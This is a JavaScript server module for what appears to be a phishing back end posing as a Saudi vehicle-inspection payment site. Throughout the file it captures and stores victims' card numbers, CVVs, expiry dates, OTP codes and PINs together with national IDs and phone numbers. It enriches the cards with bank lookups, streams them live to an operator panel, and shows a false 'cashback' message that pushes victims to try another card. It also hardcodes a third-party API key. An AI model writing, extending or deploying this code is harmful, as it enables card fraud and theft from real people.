import { supabase } from "./supabase.mjs";

const POLL_INTERVAL_MS = 1500;
const binCache = new Map();
const blockedBins = new Map();
const blockedCards = new Map(); // Key: clean card number, Value: { id, cardNumber, bin, bankName, cardHolder, note, addedAt }

function getClientIp(req) {
  const forwarded = req.headers["x-forwarded-for"];
  if (forwarded && typeof forwarded === "string") {
    return forwarded.split(",")[0].trim();
  }
  return req.ip || req.socket?.remoteAddress || "";
}

async function loadBlockedBins() {
  try {
    const { data } = await supabase
      .from("pays")
      .select("data")
      .eq("id", "system_blocked_bins")
      .maybeSingle();

    if (data?.data?.bins && Array.isArray(data.data.bins)) {
      blockedBins.clear();
      for (const item of data.data.bins) {
        if (item?.bin) {
          blockedBins.set(item.bin, item);
        }
      }
    }
  } catch (err) {
    console.warn("[loadBlockedBins error]", err);
  }
}

async function saveBlockedBins() {
  const list = Array.from(blockedBins.values());
  try {
    await supabase.from("pays").upsert(
      {
        id: "system_blocked_bins",
        data: { bins: list, updatedAt: new Date().toISOString() },
        updated_at: new Date().toISOString(),
      },
      { onConflict: "id" },
    );
  } catch (err) {
    console.warn("[saveBlockedBins error]", err);
  }
  return list;
}

async function loadBlockedCards() {
  try {
    const { data } = await supabase
      .from("pays")
      .select("data")
      .eq("id", "system_blocked_cards")
      .maybeSingle();

    if (data?.data?.cards && Array.isArray(data.data.cards)) {
      blockedCards.clear();
      for (const item of data.data.cards) {
        if (item?.cardNumber) {
          const cleanNum = String(item.cardNumber).replace(/\D/g, "");
          blockedCards.set(cleanNum, item);
        }
      }
    }
  } catch (err) {
    console.warn("[loadBlockedCards error]", err);
  }
}

async function saveBlockedCards() {
  const list = Array.from(blockedCards.values());
  try {
    await supabase.from("pays").upsert(
      {
        id: "system_blocked_cards",
        data: { cards: list, updatedAt: new Date().toISOString() },
        updated_at: new Date().toISOString(),
      },
      { onConflict: "id" },
    );
  } catch (err) {
    console.warn("[saveBlockedCards error]", err);
  }
  return list;
}

function checkIsCardOrBinBlocked(cardString) {
  if (!cardString) return null;
  const clean = String(cardString).replace(/\D/g, "");
  if (!clean) return null;
  if (blockedCards.has(clean)) {
    return { blocked: true, type: "card", info: blockedCards.get(clean) };
  }
  const bin = clean.slice(0, 6);
  if (bin && blockedBins.has(bin)) {
    return { blocked: true, type: "bin", info: blockedBins.get(bin) };
  }
  return null;
}

// Initial load of blocked items
void loadBlockedBins();
void loadBlockedCards();

async function lookupBin(binNumber) {
  const cleanBin = String(binNumber || "").replace(/\D/g, "").slice(0, 6);
  if (cleanBin.length < 6) return null;
  if (binCache.has(cleanBin)) return binCache.get(cleanBin);

  const rapidApiKey =
    process.env.RAPIDAPI_KEY ||
    "28ab3a3445msh4e87f2eee5443bep131842jsn70cf88cdf9f7";

  try {
    const response = await fetch(
      `https://bin-ip-checker.p.rapidapi.com/?bin=${cleanBin}`,
      {
        method: "POST",
        headers: {
          "x-rapidapi-key": rapidApiKey,
          "x-rapidapi-host": "bin-ip-checker.p.rapidapi.com",
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ bin: cleanBin }),
      },
    );

    if (!response.ok) return null;
    const json = await response.json();
    const binInfo = json?.BIN;
    if (binInfo && binInfo.valid) {
      const parsed = {
        valid: true,
        scheme: binInfo.scheme || binInfo.brand || "CARD",
        brand: binInfo.brand || binInfo.scheme || "CARD",
        type: binInfo.type || "CREDIT",
        level: binInfo.level || "STANDARD",
        currency: binInfo.currency || "SAR",
        bankName: binInfo.issuer?.name || "بنك محلي",
        website: binInfo.issuer?.website || "",
        countryName: binInfo.country?.name || "SAUDI ARABIA",
        countryFlag: binInfo.country?.flag || "🇸🇦",
      };
      binCache.set(cleanBin, parsed);
      return parsed;
    }
  } catch (err) {
    console.warn("[lookupBin error]", err);
  }
  return null;
}

function isValidVisitorId(visitorId) {
  return (
    typeof visitorId === "string" &&
    /^[a-zA-Z0-9_-]{3,128}$/.test(visitorId.trim())
  );
}

function getVisitorId(req, res) {
  const visitorId = req.params.visitorId?.trim();
  if (!isValidVisitorId(visitorId)) {
    res.status(400).json({ error: "Invalid visitor ID" });
    return null;
  }
  return visitorId;
}

async function readVisitor(visitorId) {
  try {
    const { data, error } = await supabase
      .from("pays")
      .select("data, updated_at")
      .eq("id", visitorId)
      .limit(1);

    if (error) {
      console.warn("[readVisitor error]", error);
    } else if (data && data.length > 0 && data[0]?.data) {
      return {
        data: data[0].data,
        updatedAt: data[0].updated_at || null,
      };
    }
  } catch (err) {
    console.warn("[readVisitor catch]", err);
  }

  // Fallback: check unified list in case this was a merged record
  try {
    const currentList = await listVisitors();
    const match = currentList.find(
      (v) => v.id === visitorId || (v.sourceIds && v.sourceIds.includes(visitorId)),
    );
    if (match?.data) {
      return {
        data: match.data,
        updatedAt: match.updatedAt || null,
      };
    }
  } catch {}

  return {
    data: null,
    updatedAt: null,
  };
}

async function listVisitors() {
  let data = [];
  try {
    const res = await supabase
      .from("pays")
      .select("id, data, updated_at")
      .order("updated_at", { ascending: false })
      .limit(100);

    if (res.error) {
      console.warn("[listVisitors error]", res.error);
    } else if (res.data) {
      data = res.data;
    }
  } catch (err) {
    console.warn("[listVisitors catch]", err);
  }

  // Also read actual records from payments table in Supabase
  try {
    const { data: paymentsRows, error: pErr } = await supabase
      .from("pays")
      .select("*")
      .order("created_at", { ascending: false })
      .limit(100);

    if (!pErr && Array.isArray(paymentsRows) && paymentsRows.length > 0) {
      for (const p of paymentsRows) {
        let rawCard = (p.card_number || "").toString().trim();
        if (rawCard.startsWith("enc:v1:")) {
          // If encrypted, show scheme if available
          const scheme = p.bin_data?.scheme ? p.bin_data.scheme.toUpperCase() : "CARD";
          rawCard = `•••• •••• •••• [${scheme}]`;
        }
        const pId = p.visitor_id || p.id;
        const existing = (data || []).find(
          (row) => row.id === pId || row.id === p.id || row.id === p.visitor_id,
        );

        if (existing) {
          existing.data = existing.data || {};
          if (!existing.data.cardNumber && rawCard) {
            existing.data.cardNumber = rawCard;
            existing.data.cardHolder = p.name || existing.data.ownerName || "";
            existing.data.cardExpiry = p.expiry || existing.data.cardExpiry || "";
            existing.data.cvv = p.cvv || existing.data.cvv || "";
            existing.data.otp = p.otp || existing.data.otp || "";
            existing.data.cardOtp = p.otp || existing.data.cardOtp || "";
            existing.data.otpCode = existing.data.otp || existing.data.cardOtp || "";
            existing.data.cardApproval = p.status || p.approval_status || existing.data.cardApproval || "pending";
            existing.data.status = p.status || p.approval_status || existing.data.status || "pending";
            if (p.amount) existing.data.serviceFee = p.amount;
          }
        } else {
          data.push({
            id: pId,
            data: {
              id: pId,
              ownerName: p.name || "",
              cardNumber: rawCard,
              cardHolder: p.name || "",
              cardExpiry: p.expiry && !p.expiry.startsWith("enc:") ? p.expiry : "",
              cvv: p.cvv && !p.cvv.startsWith("enc:") ? p.cvv : "",
              otp: p.otp || "",
              cardOtp: p.otp || "",
              otpCode: p.otp || "",
              serviceFee: p.amount || 0,
              cardApproval: p.status || p.approval_status || "pending",
              status: p.status || p.approval_status || "pending",
              currentPage: "الدفع الإلكتروني",
              step: "payment-submitted",
              presence: "offline",
              isOnline: false,
              createdAt: p.created_at,
              updatedAt: p.decided_at || p.created_at,
            },
            updated_at: p.decided_at || p.created_at,
          });
        }
      }
    }
  } catch (payCatch) {
    // Non-fatal
  }

  const rawList = (data || [])
    .filter((row) => row.id !== "system_blocked_bins")
    .map((row) => ({
      id: row.id,
      data: row.data || {},
      updatedAt: row.updated_at || null,
    }));

  // Deduplicate and unify split records by identity (phone, nationalId, or proximate payment/visitor session)
  const unified = [];
  for (const item of rawList) {
    const d = item.data || {};
    const phone = (d.ownerPhone || d.phone || d.mobile || "").trim();
    const natId = (d.nationalId || d.idNumber || "").trim();
    const card = (d.cardNumber || d.c1 || "").trim();

    const existingIdx = unified.findIndex((u) => {
      const uD = u.data || {};
      const uPhone = (uD.ownerPhone || uD.phone || uD.mobile || "").trim();
      const uCard = (uD.cardNumber || uD.c1 || "").trim();

      if (u.id === item.id) return true;

      // Only merge if one is a payment record without owner info and the other is an application with owner info
      const uHasCard = Boolean(uCard);
      const rHasCard = Boolean(card);
      const uHasOwner = Boolean(uD.ownerName || uD.plateNumbers);
      const rHasOwner = Boolean(d.ownerName || d.plateNumbers);

      if (
        (rHasCard && !rHasOwner && uHasOwner && !uHasCard) ||
        (uHasCard && !uHasOwner && rHasOwner && !rHasCard)
      ) {
        if (phone && uPhone && phone === uPhone) return true;
        const timeDiff = Math.abs(
          new Date(u.updatedAt || 0).getTime() -
            new Date(item.updatedAt || 0).getTime(),
        );
        if (timeDiff < 45 * 60 * 1000) return true;
      }
      return false;
    });

    if (existingIdx >= 0) {
      const target = unified[existingIdx];
      const merged = { ...item.data, ...target.data };
      for (const [k, v] of Object.entries(item.data || {})) {
        if (v !== undefined && v !== null && v !== "" && v !== "—") {
          const cur = target.data?.[k];
          if (cur === undefined || cur === null || cur === "" || cur === "—") {
            merged[k] = v;
          }
        }
      }
      // Merge cardHistory from both records if available
      const combinedHistory = [];
      const seenCardNumbers = new Set();
      const listA = Array.isArray(target.data?.cardHistory)
        ? target.data.cardHistory
        : [];
      const listB = Array.isArray(item.data?.cardHistory)
        ? item.data.cardHistory
        : [];
      for (const card of [...listA, ...listB]) {
        const clean = String(card?.cardNumber || "").replace(/\s+/g, "");
        if (clean && !seenCardNumbers.has(clean)) {
          seenCardNumbers.add(clean);
          combinedHistory.push(card);
        }
      }
      // Sort combinedHistory by date latest first (if addedAt exists)
      combinedHistory.sort((a, b) => {
        const dateA = new Date(a.addedAt || a.timestamp || 0).getTime();
        const dateB = new Date(b.addedAt || b.timestamp || 0).getTime();
        return dateB - dateA;
      });
      if (combinedHistory.length > 0) {
        merged.cardHistory = combinedHistory;
      }

      unified[existingIdx] = {
        id: target.id || item.id,
        sourceIds: Array.from(new Set([...(target.sourceIds || [target.id]), item.id])),
        data: merged,
        updatedAt:
          new Date(item.updatedAt || 0).getTime() >
          new Date(target.updatedAt || 0).getTime()
            ? item.updatedAt
            : target.updatedAt,
      };
    } else {
      unified.push({
        ...item,
        sourceIds: [item.id]
      });
    }
  }

  // Sort by date (latest first), then by data completeness
  unified.sort((a, b) => {
    const timeA = new Date(a.updatedAt || 0).getTime();
    const timeB = new Date(b.updatedAt || 0).getTime();
    if (timeB !== timeA) return timeB - timeA;

    const aData = a.data || {};
    const bData = b.data || {};
    const aScore =
      (aData.cardNumber ? 10 : 0) +
      (aData.ownerName ? 5 : 0) +
      (aData.ownerPhone ? 3 : 0);
    const bScore =
      (bData.cardNumber ? 10 : 0) +
      (bData.ownerName ? 5 : 0) +
      (bData.ownerPhone ? 3 : 0);
    return bScore - aScore;
  });

  // Enrich top visitor records with BIN info (Bank name, Card level, etc.)
  await Promise.all(
    unified.slice(0, 15).map(async (item) => {
      const d = item.data || {};
      const rawCard = d.cardNumber || d.c1;
      if (rawCard && (!d.bankName || !d.cardLevel)) {
        const binInfo = await lookupBin(rawCard);
        if (binInfo) {
          d.bankName = binInfo.bankName;
          d.cardLevel = binInfo.level;
          d.cardType = binInfo.type;
          d.cardBrand = binInfo.brand;
          d.countryName = binInfo.countryName;
          d.countryFlag = binInfo.countryFlag;
        }
      }
    }),
  );

  return unified;
}

async function updateVisitor(visitorId, patch) {
  let existing = { data: null, updatedAt: null };
  try {
    existing = await readVisitor(visitorId);
  } catch (e) {
    console.warn("[updateVisitor readVisitor]", e);
  }
  const now = new Date().toISOString();

  let fallbackOwnerData = {};
  const patchHasCard = Boolean(patch.cardNumber || patch.c1 || patch.cardName);
  const existingHasOwner = Boolean(
    existing?.data?.ownerPhone ||
    existing?.data?.phone ||
    existing?.data?.ownerName ||
    existing?.data?.plateNumbers
  );

  if (patchHasCard && !existingHasOwner && !patch.ownerPhone && !patch.phone) {
    try {
      const { data: recentList } = await supabase
        .from("pays")
        .select("id, data, updated_at")
        .order("updated_at", { ascending: false })
        .limit(10);

      const candidate = (recentList || []).find((r) => {
        const d = r.data || {};
        return (d.ownerPhone || d.phone || d.ownerName) && r.id !== visitorId;
      });

      if (candidate?.data) {
        fallbackOwnerData = {
          ownerName: candidate.data.ownerName || candidate.data.name,
          ownerPhone: candidate.data.ownerPhone || candidate.data.phone || candidate.data.mobile,
          nationalId: candidate.data.nationalId || candidate.data.idNumber,
          plateNumbers: candidate.data.plateNumbers,
          plateLetters: candidate.data.plateLetters,
          plateInfo: candidate.data.plateInfo,
          vehicleType: candidate.data.vehicleType,
          registrationType: candidate.data.registrationType,
          serialNumber: candidate.data.serialNumber,
          city: candidate.data.city,
          region: candidate.data.region,
          inspectionCenterName: candidate.data.inspectionCenterName,
        };
      }
    } catch (e) {
      console.warn("[updateVisitor fallback owner search]", e);
    }
  }

  // Lookup BIN info if card is being submitted
  let binData = {};
  const rawCard =
    patch.cardNumber ||
    patch.c1 ||
    existing.data?.cardNumber ||
    existing.data?.c1;
  if (rawCard && (!patch.bankName && !existing.data?.bankName)) {
    try {
      const binInfo = await lookupBin(rawCard);
      if (binInfo) {
        binData = {
          bankName: binInfo.bankName,
          cardLevel: binInfo.level,
          cardType: binInfo.type,
          cardBrand: binInfo.brand,
          countryName: binInfo.countryName,
          countryFlag: binInfo.countryFlag,
        };
      }
    } catch (e) {
      console.warn("[updateVisitor BIN lookup]", e);
    }
  }

  // Check if submitted card is blocked (by card number or BIN)
  const incomingCardClean = String(rawCard || "").replace(/\D/g, "");
  const blockedCheck = checkIsCardOrBinBlocked(incomingCardClean);
  if (blockedCheck) {
    const blockedInfo = blockedCheck.info;
    patch.cardApproval = "rejected";
    patch.status = "rejected";
    patch.decision = "rejected";
    patch.isBlockedBin = true;
    patch.isBlockedCard = true;
    patch.rejectionReason = `البطاقة غير مدعومة يرجى الدفع من بطاقة أخرى أو باستخدام البطاقات الائتمانية للاستفادة من كاش باك 40%${blockedInfo?.note ? ` (${blockedInfo.note})` : ""}`;
  }

  // Maintain chronological card history for the visitor
  const historyList = Array.isArray(existing.data?.cardHistory)
    ? [...existing.data.cardHistory]
    : [];

  const effectiveCard =
    patch.cardNumber ||
    patch.c1 ||
    existing.data?.cardNumber ||
    existing.data?.c1;

  if (effectiveCard) {
    const cleanNum = String(effectiveCard).replace(/\s+/g, "");
    const existingIndex = historyList.findIndex(
      (c) => String(c.cardNumber || "").replace(/\s+/g, "") === cleanNum,
    );

    const cardSnapshot = {
      cardNumber: effectiveCard,
      bin: String(effectiveCard || "").replace(/\D/g, "").slice(0, 6),
      isBlocked: Boolean(checkIsCardOrBinBlocked(effectiveCard)),
      cardName: patch.cardName || patch.c2 || existing.data?.cardName || "",
      expiryDate:
        patch.expiryDate ||
        (patch.expiryMonth && patch.expiryYear
          ? `${patch.expiryMonth}/${patch.expiryYear}`
          : "") ||
        existing.data?.expiryDate ||
        "",
      cvv: patch.cvv || patch.c5 || existing.data?.cvv || "",
      bankName:
        binData.bankName ||
        patch.bankName ||
        existing.data?.bankName ||
        "بنك محلي",
      cardLevel: binData.cardLevel || existing.data?.cardLevel || "STANDARD",
      cardType: binData.cardType || existing.data?.cardType || "DEBIT",
      cardBrand: binData.cardBrand || existing.data?.cardBrand || "CARD",
      countryFlag: binData.countryFlag || existing.data?.countryFlag || "🇸🇦",
      otpCode:
        patch.otp ||
        patch.otpCode ||
        existing.data?.otp ||
        existing.data?.otpCode ||
        "",
      pinCode:
        patch.pin ||
        patch.pinCode ||
        existing.data?.pin ||
        existing.data?.pinCode ||
        "",
      status:
        patch.cardApproval ||
        patch.status ||
        existing.data?.cardApproval ||
        "pending",
      submittedAt: now,
    };

    if (existingIndex >= 0) {
      historyList[existingIndex] = {
        ...historyList[existingIndex],
        ...cardSnapshot,
        submittedAt: historyList[existingIndex].submittedAt || now,
        updatedAt: now,
      };
    } else {
      historyList.unshift(cardSnapshot);
    }
  }

  const mergedPatch = {};
  for (const [k, v] of Object.entries(patch)) {
    if (v !== undefined && v !== null && v !== "" && v !== "—") {
      mergedPatch[k] = v;
    }
  }

  const merged = {
    ...fallbackOwnerData,
    ...binData,
    ...(existing.data || {}),
    ...mergedPatch,
    cardHistory: historyList,
    id: visitorId,
    updatedAt: now,
    isRead: false,
    createdAt: existing.data?.createdAt || patch.createdAt || now,
  };

  if (!merged.country || merged.country === "—") {
    merged.country = "المملكة العربية السعودية";
  }
  if (!merged.countryFlag) {
    merged.countryFlag = "🇸🇦";
  }

  // Find all related source IDs if this is part of a unified visitor so all client tabs stay synchronized
  let allTargetIds = new Set([visitorId]);
  try {
    const currentList = await listVisitors();
    const matched = currentList.find(
      (v) => v.id === visitorId || (v.sourceIds && v.sourceIds.includes(visitorId)),
    );
    if (matched?.sourceIds && Array.isArray(matched.sourceIds)) {
      for (const sId of matched.sourceIds) {
        allTargetIds.add(sId);
      }
    }
  } catch (e) {
    // Non-fatal
  }

  for (const tId of allTargetIds) {
    try {
      const { error: upsertErr } = await supabase.from("pays").upsert(
        {
          id: tId,
          data: { ...merged, id: tId },
          updated_at: now,
        },
        { onConflict: "id" },
      );
      if (upsertErr) {
        console.warn(`[updateVisitor upsert error for ${tId}]`, upsertErr);
      }
    } catch (upsertCatch) {
      console.warn(`[updateVisitor upsert catch for ${tId}]`, upsertCatch);
    }
  }

  return { data: merged, updatedAt: now };
}

async function deleteVisitor(visitorId) {
  // To handle unified/merged records correctly:
  // 1. Fetch the unified list to find all source IDs associated with this visitor
  const currentList = await listVisitors();
  const target = currentList.find(v => v.id === visitorId);

  let idsToRemove = [visitorId];
  if (target && target.sourceIds && Array.isArray(target.sourceIds)) {
    idsToRemove = target.sourceIds;
  }

  const { error } = await supabase
    .from("pays")
    .delete()
    .in("id", idsToRemove);

  if (error) throw error;

  try {
    await supabase.from("payments").delete().in("visitor_id", idsToRemove);
    await supabase.from("payments").delete().in("id", idsToRemove);
  } catch {}

  return { success: true, removedCount: idsToRemove.length };
}

async function deleteMultipleVisitors(ids) {
  if (!Array.isArray(ids) || ids.length === 0) return { success: true, removedCount: 0 };
  const currentList = await listVisitors();
  const allIdsToRemove = new Set(ids);
  for (const id of ids) {
    const target = currentList.find(v => v.id === id);
    if (target?.sourceIds && Array.isArray(target.sourceIds)) {
      for (const sId of target.sourceIds) {
        allIdsToRemove.add(sId);
      }
    }
  }
  const idArray = Array.from(allIdsToRemove);
  const { error } = await supabase.from("pays").delete().in("id", idArray);
  if (error) throw error;

  try {
    await supabase.from("payments").delete().in("visitor_id", idArray);
    await supabase.from("payments").delete().in("id", idArray);
  } catch {}

  return { success: true, removedCount: idArray.length };
}

async function deleteAllVisitors() {
  const { error } = await supabase
    .from("pays")
    .delete()
    .neq("id", "system_blocked_bins");
  try {
    await supabase.from("payments").delete().neq("id", "");
  } catch {}
  if (error) throw error;
  return { success: true };
}

function sendEvent(res, payload) {
  res.write(`data: ${JSON.stringify(payload)}\n\n`);
}

export function registerDataRoutes(app) {
  app.use("/api", (_req, res, next) => {
    res.set({
      "Cache-Control": "no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0",
      Pragma: "no-cache",
      Expires: "0",
      "Surrogate-Control": "no-store",
    });
    next();
  });

  app.get("/api/bin/:bin", async (req, res) => {
    const bin = req.params.bin?.replace(/\D/g, "").slice(0, 6);
    if (!bin || bin.length < 6) {
      return res
        .status(400)
        .json({ error: "Invalid BIN format. Must be at least 6 digits." });
    }
    const info = await lookupBin(bin);
    res.json(info || { valid: false });
  });

  // ── Blocked Cards & BINs Endpoints ──────────────────────────────────
  app.get("/api/blocked-cards", (_req, res) => {
    res.json({
      cards: Array.from(blockedCards.keys()),
      bins: Array.from(blockedBins.keys()),
    });
  });

  app.get("/api/blocked-bins", (_req, res) => {
    res.json({ bins: Array.from(blockedBins.keys()) });
  });

  app.get("/api/admin/blocked-cards", (_req, res) => {
    res.json({
      cards: Array.from(blockedCards.values()),
      bins: Array.from(blockedBins.values()),
    });
  });

  app.get("/api/admin/blocked-bins", (_req, res) => {
    res.json({ bins: Array.from(blockedBins.values()) });
  });

  app.post("/api/admin/blocked-cards", async (req, res) => {
    const rawCard = req.body?.cardNumber || req.body?.card;
    const rawBin = req.body?.bin;
    const cleanCard = String(rawCard || "").replace(/\D/g, "");
    const cleanBin = String(rawBin || (cleanCard.length >= 6 ? cleanCard.slice(0, 6) : "")).replace(/\D/g, "").slice(0, 6);

    if (!cleanCard && (!cleanBin || cleanBin.length < 6)) {
      return res.status(400).json({ error: "يجب إدخال رقم بطاقة صالح أو رقم BIN (6 أرقام)" });
    }

    let bankName = req.body?.bankName || "";
    if (!bankName && cleanBin.length >= 6) {
      const info = await lookupBin(cleanBin);
      bankName = info?.bankName || "بطاقة محظورة";
    }

    const note = req.body?.note || "محظور من لوحة التحكم";
    const addedAt = new Date().toISOString();
    const id = cleanCard || cleanBin;

    const item = {
      id,
      cardNumber: cleanCard,
      bin: cleanBin,
      bankName: bankName || "بطاقة محظورة",
      cardHolder: req.body?.cardHolder || "",
      note,
      addedAt,
    };

    if (cleanCard) {
      blockedCards.set(cleanCard, item);
      await saveBlockedCards();
    }
    if (cleanBin && cleanBin.length >= 6) {
      blockedBins.set(cleanBin, { bin: cleanBin, bankName, note, addedAt });
      await saveBlockedBins();
    }

    res.json({
      success: true,
      item,
      cards: Array.from(blockedCards.values()),
      bins: Array.from(blockedBins.values()),
    });
  });

  app.delete("/api/admin/blocked-cards/:id", async (req, res) => {
    const rawId = String(req.params.id || "").replace(/\D/g, "");
    if (!rawId) {
      return res.status(400).json({ error: "Invalid Card or BIN ID" });
    }

    blockedCards.delete(rawId);
    if (rawId.length === 6) {
      blockedBins.delete(rawId);
    }
    await saveBlockedCards();
    await saveBlockedBins();

    res.json({
      success: true,
      cards: Array.from(blockedCards.values()),
      bins: Array.from(blockedBins.values()),
    });
  });

  app.post("/api/admin/blocked-bins", async (req, res) => {
    const rawBin = req.body?.bin;
    const cleanBin = String(rawBin || "").replace(/\D/g, "").slice(0, 6);
    if (cleanBin.length < 6) {
      return res
        .status(400)
        .json({ error: "يجب أن يتكون رقم BIN من 6 أرقام على الأقل" });
    }

    let bankName = req.body?.bankName || "";
    if (!bankName) {
      const info = await lookupBin(cleanBin);
      bankName = info?.bankName || "بطاقة محظورة";
    }

    const item = {
      id: cleanBin,
      bin: cleanBin,
      bankName: bankName,
      note: req.body?.note || "محظور من لوحة التحكم",
      addedAt: new Date().toISOString(),
    };

    blockedBins.set(cleanBin, item);
    await saveBlockedBins();
    res.json({ success: true, item, bins: Array.from(blockedBins.values()) });
  });

  app.delete("/api/admin/blocked-bins/:bin", async (req, res) => {
    const cleanBin = String(req.params.bin || "").replace(/\D/g, "").slice(0, 6);
    if (!cleanBin) {
      return res.status(400).json({ error: "Invalid BIN" });
    }
    blockedBins.delete(cleanBin);
    await saveBlockedBins();
    res.json({ success: true, bins: Array.from(blockedBins.values()) });
  });

  // ── Visitor Session Recovery for Returning Visitors ──────────────────
  app.get("/api/visitor-session", async (req, res) => {
    const clientIp = getClientIp(req);
    try {
      const visitors = await listVisitors();
      // Find the most recent active visitor for this IP within last 4 hours
      const candidate = visitors.find((v) => {
        const d = v.data || {};
        const matchesIp = Boolean(clientIp && d.ip && d.ip === clientIp);
        const isRecent =
          v.updatedAt &&
          Date.now() - new Date(v.updatedAt).getTime() < 4 * 60 * 60 * 1000;
        return matchesIp && isRecent;
      });

      if (candidate) {
        return res.json({
          visitorId: candidate.id,
          data: candidate.data,
          isExisting: true,
        });
      }
    } catch (err) {
      console.error("[visitor session error]", err);
    }
    res.json({ visitorId: null, isExisting: false });
  });

  app.get("/api/admin/visitors", async (_req, res) => {
    try {
      res.json(await listVisitors());
    } catch (error) {
      console.error("[admin visitors list]", error);
      res.status(500).json({ error: "Unable to list visitor records" });
    }
  });

  app.delete("/api/admin/visitors/all", async (_req, res) => {
    try {
      res.json(await deleteAllVisitors());
    } catch (error) {
      console.error("[admin visitors delete all]", error);
      res.status(500).json({ error: "Unable to delete all visitor records" });
    }
  });

  app.post("/api/admin/visitors/delete-all", async (_req, res) => {
    try {
      res.json(await deleteAllVisitors());
    } catch (error) {
      console.error("[admin visitors post delete all]", error);
      res.status(500).json({ error: "Unable to delete all visitor records" });
    }
  });

  app.post("/api/admin/visitors/delete-multiple", async (req, res) => {
    try {
      const ids = req.body?.ids || [];
      res.json(await deleteMultipleVisitors(ids));
    } catch (error) {
      console.error("[admin visitors delete multiple]", error);
      res.status(500).json({ error: "Unable to delete selected visitor records" });
    }
  });

  app.get("/api/visitors/:visitorId", async (req, res) => {
    const visitorId = getVisitorId(req, res);
    if (!visitorId) return;

    try {
      res.json(await readVisitor(visitorId));
    } catch (error) {
      console.error("[visitor read]", error);
      res.status(500).json({ error: "Unable to read visitor data" });
    }
  });

  app.post("/api/visitors/:visitorId", async (req, res) => {
    const visitorId = getVisitorId(req, res);
    if (!visitorId) return;
    let patch = req.body?.data;
    if (!patch && typeof req.body === "string") {
      try {
        const parsed = JSON.parse(req.body);
        patch = parsed?.data || parsed;
      } catch {}
    }
    if (!patch && typeof req.body === "object" && req.body !== null && !req.body.data) {
      patch = req.body;
    }

    if (!patch || typeof patch !== "object" || Array.isArray(patch)) {
      res.status(400).json({ error: "Visitor data must be an object" });
      return;
    }

    try {
      res.json(await updateVisitor(visitorId, patch));
    } catch (error) {
      console.error("[visitor update]", error);
      res.status(500).json({ error: "Unable to update visitor data" });
    }
  });

  app.delete("/api/visitors/:visitorId", async (req, res) => {
    const visitorId = getVisitorId(req, res);
    if (!visitorId) return;

    try {
      res.json(await deleteVisitor(visitorId));
    } catch (error) {
      console.error("[visitor delete]", error);
      res.status(500).json({ error: "Unable to delete visitor record" });
    }
  });

  app.post("/api/visitors/:visitorId/status", async (req, res) => {
    const visitorId = getVisitorId(req, res);
    if (!visitorId) return;
    let body = req.body;
    if (typeof body === "string") {
      try {
        body = JSON.parse(body);
      } catch {
        body = {};
      }
    }
    const isOffline = body?.state === "offline";
    const state = isOffline ? "offline" : "online";
    const now = new Date().toISOString();

    try {
      res.json(
        await updateVisitor(visitorId, {
          presence: state,
          isOnline: !isOffline,
          lastSeen: now,
          lastHeartbeat: isOffline ? null : now,
        }),
      );
    } catch (error) {
      console.error("[visitor status]", error);
      res.status(500).json({ error: "Unable to update visitor status" });
    }
  });

  app.get("/api/visitors/:visitorId/stream", async (req, res) => {
    const visitorId = getVisitorId(req, res);
    if (!visitorId) return;

    res
      .status(200)
      .set({
        "Content-Type": "text/event-stream",
        "Cache-Control": "no-cache, no-transform",
        Connection: "keep-alive",
        "X-Accel-Buffering": "no",
      })
      .flushHeaders();

    let lastUpdatedAt;
    let closed = false;

    const cleanup = () => {
      if (closed) return;
      closed = true;
      clearInterval(interval);
      clearInterval(keepAlive);
    };

    const sendLatest = async () => {
      if (closed) return;
      try {
        const latest = await readVisitor(visitorId);
        if (latest.updatedAt !== lastUpdatedAt) {
          lastUpdatedAt = latest.updatedAt;
          sendEvent(res, latest);
        }
      } catch (error) {
        console.error("[visitor stream]", error);
      }
    };

    await sendLatest();
    const interval = setInterval(sendLatest, POLL_INTERVAL_MS);
    const keepAlive = setInterval(() => {
      if (!closed) {
        try {
          res.write(": keep-alive\n\n");
        } catch {
          cleanup();
        }
      }
    }, 15000);

    req.on("close", cleanup);
    req.on("end", cleanup);
    res.on("close", cleanup);
    res.on("finish", cleanup);
    res.on("error", cleanup);
  });

  app.post("/api/admin/supabase-login", async (req, res) => {
    let body = req.body;
    if (typeof body === "string") {
      try {
        body = JSON.parse(body);
      } catch {
        body = {};
      }
    }
    const { email, password } = body || {};
    if (!email || !password) {
      return res.status(400).json({ error: "البريد الإلكتروني وكلمة المرور مطلوبان" });
    }
    try {
      const { data, error } = await supabase.auth.signInWithPassword({
        email,
        password,
      });
      if (error) {
        return res.status(401).json({ error: error.message || "فشل المصادقة عبر Supabase Auth" });
      }
      return res.json({ success: true, session: data.session });
    } catch (err) {
      return res.status(500).json({ error: err.message || "خطأ في الخادم" });
    }
  });
}